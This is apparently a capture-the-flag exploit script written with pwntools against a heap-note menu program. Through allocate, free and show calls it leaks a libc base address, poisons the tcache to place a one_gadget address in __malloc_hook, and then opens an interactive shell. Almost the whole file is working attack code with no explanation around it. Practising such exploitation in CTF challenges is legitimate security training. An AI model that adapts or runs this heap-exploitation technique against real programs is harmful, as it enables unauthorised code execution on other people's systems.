from pwn import *
context(arch = 'amd64', os = 'linux')
#context(arch = 'i386', os = 'linux')
#context.log_level = 'debug'

io = process("./pwn")
elf = ELF("./pwn")
libc = elf.libc

def debug():
	gdb.attach(io)
	pause()

sd     = lambda s    : io.send(s)
sda    = lambda s, n : io.sendafter(s, n)
sl     = lambda s    : io.sendline(s)
sla    = lambda s, n : io.sendlineafter(s, n)
rc     = lambda n    : io.recv(n)
rut    = lambda s    : io.recvuntil(s, drop=True)
ruf    = lambda s    : io.recvuntil(s, drop=False)
addr   = lambda n    : u64(io.recv(n, timeout=1).ljust(8, b'\x00'))
addr32 = lambda s    : u32(io.recvuntil(s, drop=True, timeout=1).ljust(4, b'\x00'))
addr64 = lambda s    : u64(io.recvuntil(s, drop=True, timeout=1).ljust(8, b'\x00'))
byte   = lambda n    : str(n).encode()
sh     = lambda      : io.interactive()
menu   = b'command?\n> '
def add(size, content):
	sla(menu, b'1')
	sla(b'size \n> ', byte(size))
	sda(b'content \n> ', content)

def dele(idx):
	sla(menu, b'2')
	sla(b'index \n> ', byte(idx))
	
def show(idx):
	sla(menu, b'3')
	sla(b'index \n> ', byte(idx))

for i in range(10):
	add(0x10, b'A\n')

for i in range(6):
	dele(i)
dele(9)
dele(6)
dele(7)
dele(8)

for i in range(10):
	add(0x10, b'B\n')

for i in range(6):
	dele(i)
dele(8)
dele(7)
add(0xF8, b'C\n')
dele(6)
dele(9)

for i in range(8):
	add(0x10, b'D\n')
show(0)
libc.address = addr64(b'\n') - 0x3ebca0
print("\033[32m[libc_base -> "+str(hex(libc.address))+"]\033[0m")
free_hook = libc.sym.__free_hook
malloc_hook = libc.sym.__malloc_hook
add(0x10, b'D\n')
dele(1)
dele(0)
dele(2)
dele(9)

"""
 rcx [rsp+0x40] [rsp+0x70]
"""
ones = [0x4f2c5, 0x4f322, 0x10a38c]
ones = [i+libc.address for i in ones]

add(0x10, p64(malloc_hook))
add(0x10, b'E\n')
add(0x10, b'E\n')
add(0x10, p64(ones[2]))
dele(0)
sla(menu, b'1')
#debug()

sh()
